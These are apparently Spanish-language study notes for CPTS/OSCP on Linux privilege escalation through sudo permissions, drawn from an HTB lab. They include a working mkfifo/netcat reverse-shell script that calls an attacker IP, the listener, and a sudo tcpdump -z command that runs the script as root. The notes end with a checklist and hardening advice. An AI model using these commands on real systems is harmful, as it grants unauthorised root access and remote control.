
## 1. Enumerar permisos de Sudo

El primer paso al conseguir acceso a una máquina es comprobar qué comandos puedes ejecutar con `sudo`.

```
sudo -l
```

Ejemplo de salida:

```
(root) NOPASSWD: /usr/sbin/tcpdump
```

Esto significa que puedes ejecutar `tcpdump` como `root` sin introducir la contraseña.

- `(root)`: usuario con el que puedes ejecutar el comando.
    
- `NOPASSWD`: no requiere contraseña.
    
- `/usr/sbin/tcpdump`: ruta del binario permitido.
    

**Objetivo:** identificar programas que permitan ejecutar comandos adicionales o aprovechar funciones que no estaban previstas por el administrador.

## 2. Abuso de permisos de Sudo

Algunos programas permiten ejecutar comandos o scripts mediante sus opciones. Si puedes ejecutar uno de estos programas como `root`, podrías aprovechar esa funcionalidad para escalar privilegios.

### Ejemplo: `tcpdump`

En el laboratorio, el usuario puede ejecutar `tcpdump` como `root`.

La opción `-z` permite ejecutar un comando después de que se cierre un archivo de captura cuando se utilizan las opciones de rotación correspondientes, como `-C` o `-G`.

### Paso 1. Crear el script

En el ejemplo de HTB, se crea `/tmp/.test` con el siguiente contenido:

```
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.3 443 >/tmp/f
```

Este script establece una reverse shell hacia la máquina atacante.

**Importante:** sustituye `10.10.14.3` por la IP de tu máquina atacante y utiliza un puerto en el que tengas un listener activo.

### Paso 2. Dar permisos de ejecución

```
chmod +x /tmp/.test
```

### Paso 3. Iniciar el listener

En la máquina atacante:

```
nc -lvnp 443
```

### Paso 4. Ejecutar `tcpdump` con privilegios

En la máquina víctima, el material muestra:

```
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

- `-i ens192`: interfaz de red que se captura.
    
- `-w /dev/null`: descarta los datos de captura.
    
- `-W 1`: limita el número de archivos de captura.
    
- `-G 1`: rota los archivos de captura cada segundo.
    
- `-z /tmp/.test`: indica el comando que se ejecutará tras cerrar un archivo.
    
- `-Z root`: solicita cambiar al usuario indicado después de la inicialización de la captura; su efecto depende de la versión y del comportamiento del programa.
    

Si la configuración permite ejecutar el script con privilegios de `root`, recibirás una conexión inversa.

Comprueba los privilegios con:

```
id
```

El resultado esperado es similar a:

```
uid=0(root) gid=0(root) groups=0(root)
```

**Nota del material:** AppArmor puede impedir este tipo de ejecución en distribuciones más recientes.

## 3. Otras vías de abuso de Sudo

Cuando encuentres un binario permitido por `sudo`, investiga si ofrece funcionalidades aprovechables.

Algunos ejemplos de funcionalidades que conviene buscar son:

- Ejecución de comandos externos.
    
- Apertura de intérpretes de comandos.
    
- Lectura o escritura de archivos protegidos.
    
- Ejecución de scripts.
    
- Opciones que permiten ejecutar programas adicionales.
    

Consulta [GTFOBins](https://gtfobins.github.io/) para comprobar si existe alguna técnica documentada para el binario encontrado.

## 4. Buenas prácticas de seguridad

El material destaca dos medidas importantes para evitar este tipo de escaladas:

**1. Utilizar rutas absolutas en sudoers.**

Especificar la ruta completa del ejecutable evita determinados abusos de `PATH`.

Por ejemplo, es preferible permitir `/bin/cat` en lugar de especificar simplemente `cat`.

**2. Aplicar el principio de mínimo privilegio.**

Conceder únicamente los permisos necesarios para realizar el trabajo. Evitar permisos de `sudo` demasiado amplios reduce las posibilidades de escalada.

## 5. Checklist para CPTS/OSCP

1. Ejecutar `sudo -l`.
    
2. Identificar los binarios permitidos y el usuario de destino.
    
3. Comprobar si se requiere contraseña.
    
4. Investigar las funciones y opciones del binario.
    
5. Consultar GTFOBins.
    
6. Comprobar si las restricciones del sistema, como AppArmor, bloquean la técnica.
    
7. Verificar los privilegios obtenidos mediante `id`.
    

**Idea clave:** no necesitas tener permisos completos de `sudo` para encontrar una vía de escalada. Un único binario mal configurado puede ser suficiente si permite realizar acciones adicionales con privilegios elevados.
